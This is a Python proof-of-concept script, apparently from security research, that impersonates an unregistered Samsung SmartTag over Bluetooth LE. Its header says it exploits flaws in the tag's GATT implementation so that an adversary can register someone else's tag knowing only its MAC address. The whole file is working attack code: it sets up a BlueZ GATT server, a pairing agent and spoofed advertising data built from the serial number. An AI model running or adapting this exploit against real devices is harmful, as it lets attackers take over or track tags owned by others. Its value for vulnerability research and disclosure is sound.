# -----------------------------------------------------------
# This script impersonates a new (non-registered) SmartTag
# This script also exploits flaws in the GATT implementation of SmartTags,
# allowing an adversary to register a SmartTag through this script without having physical
# access to the tag or knowing its cryptographic key.
# The identifier (Random Static MAC address) of the tag is required to set up this attack
# (c) 2022 Tingfeng Yu
# -----------------------------------------------------------

import argparse
import hashlib
import logging
import warnings

import config
import dbus.exceptions
import dbus.mainloop.glib
from bluepy.btle import DefaultDelegate
from gatt_agent import Agent
from gi.repository import GLib
from smarttag_gatt_server import *
from utils import *

try:
    from gi.repository import GObject  # python3
except ImportError:
    import gobject as GObject  # python2

warnings.filterwarnings("ignore")
BLUEZ_SERVICE_NAME = "org.bluez"
DBUS_OM_IFACE = "org.freedesktop.DBus.ObjectManager"
LE_ADVERTISING_MANAGER_IFACE = "org.bluez.LEAdvertisingManager1"
GATT_MANAGER_IFACE = "org.bluez.GattManager1"
DBUS_PROP_IFACE = "org.freedesktop.DBus.Properties"
AGENT_IFACE = "org.bluez.Agent1"
AGNT_MNGR_IFACE = "org.bluez.AgentManager1"
AGENT_PATH = "/my/app/agent"
AGNT_MNGR_PATH = "/org/bluez"
CAPABILITY = "NoInputNoOutput"


class ScanDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleDiscovery(self, dev, isNewDev, isNewData):
        if isNewDev:
            logging.info("Discovered device " + dev.addr)
        elif isNewData:
            logging.info("Received new data from " + dev.addr)


class Application(dbus.service.Object):
    def __init__(self, bus):
        self.path = "/"
        self.services = []
        dbus.service.Object.__init__(self, bus, self.path)

    def get_path(self):
        return dbus.ObjectPath(self.path)

    def add_service(self, service):
        self.services.append(service)

    @dbus.service.method(DBUS_OM_IFACE, out_signature="a{oa{sa{sv}}}")
    def GetManagedObjects(self):
        response = {}
        for service in self.services:
            response[service.get_path()] = service.get_properties()
            chrcs = service.get_characteristics()
            for chrc in chrcs:
                response[chrc.get_path()] = chrc.get_properties()
        return response


class TagApplication(Application):
    def __init__(self, bus):
        Application.__init__(self, bus)
        self.add_service(TagAuthService(bus, 0))
        self.add_service(Tagfd5aService(bus, 1))
        self.add_service(TagDFUService(bus, 2))
        self.add_service(DeviceInfoService(bus, 3))
        self.add_service(Tagfd59Service(bus, 4))


class TagAgent(Agent):
    def __init__(self, bus):
        Agent.__init__(self, bus)
        self.add_service(TagAuthService(bus, 0))
        self.add_service(Tagfd5aService(bus, 1))
        self.add_service(TagDFUService(bus, 2))


def find_adapter(bus):
    remote_om = dbus.Interface(bus.get_object(BLUEZ_SERVICE_NAME, "/"), DBUS_OM_IFACE)
    objects = remote_om.GetManagedObjects()
    for o, props in objects.items():
        if LE_ADVERTISING_MANAGER_IFACE in props and GATT_MANAGER_IFACE in props:
            return o
    return None


def endloop():
    config.mainloop.quit()
    return False


def advertise_smarttag_data(bus, ad_manager, agnt_mngr):
    adv = NewTagAdvertisement(bus, 0, config.nonregistered_data)
    config.mainloop = GObject.MainLoop()
    ad_manager.RegisterAdvertisement(
        adv.get_path(),
        {},
        reply_handler=register_ad_cb,
        error_handler=register_ad_error_cb,
    )
    try:
        config.mainloop.run()
    except KeyboardInterrupt:
        adv.Release()
        agnt_mngr.UnregisterAgent(AGENT_PATH)
        config.mainloop.quit()
        exit()


def main():
    config.init()
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--sn", dest="sn", type=str, default="11:22:33:44:55:66", help="serial number"
    )
    args = parser.parse_args()
    config.addr = args.sn
    sn_str = "".join(config.addr.split(":"))
    sn_bytes = bytes(sn_str, "UTF-8")
    config.sn = sn_bytes.hex()
    config.hashed_sn = hashlib.sha256(sn_bytes).hexdigest()
    config.nonregistered_data = "0130414644343330010501" + sn_bytes[-4:].hex()
    print(
        "hashed serial number: {}, BLE data: {}".format(
            config.hashed_sn, config.nonregistered_data
        )
    )
    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
    bus = dbus.SystemBus()
    adapter = find_adapter(bus)
    if not adapter:
        print("BLE adapter not found")
        return
    adapter_props = dbus.Interface(
        bus.get_object(BLUEZ_SERVICE_NAME, adapter), "org.freedesktop.DBus.Properties"
    )
    adapter_props.Set("org.bluez.Adapter1", "Powered", dbus.Boolean(1))
    ad_manager = dbus.Interface(
        bus.get_object(BLUEZ_SERVICE_NAME, adapter), LE_ADVERTISING_MANAGER_IFACE
    )
    service_manager = dbus.Interface(
        bus.get_object(BLUEZ_SERVICE_NAME, adapter), GATT_MANAGER_IFACE
    )
    app = TagApplication(bus)
    agnt_mngr = dbus.Interface(
        bus.get_object(BLUEZ_SERVICE_NAME, AGNT_MNGR_PATH), AGNT_MNGR_IFACE
    )
    config.mainloop = GLib.MainLoop()
    service_manager.RegisterApplication(
        app.get_path(),
        {},
        reply_handler=register_app_cb,
        error_handler=register_app_error_cb,
    )
    agnt_mngr.RegisterAgent(AGENT_PATH, CAPABILITY)
    agnt_mngr.RequestDefaultAgent(AGENT_PATH)
    advertise_smarttag_data(bus, ad_manager, agnt_mngr)


if __name__ == "__main__":
    main()
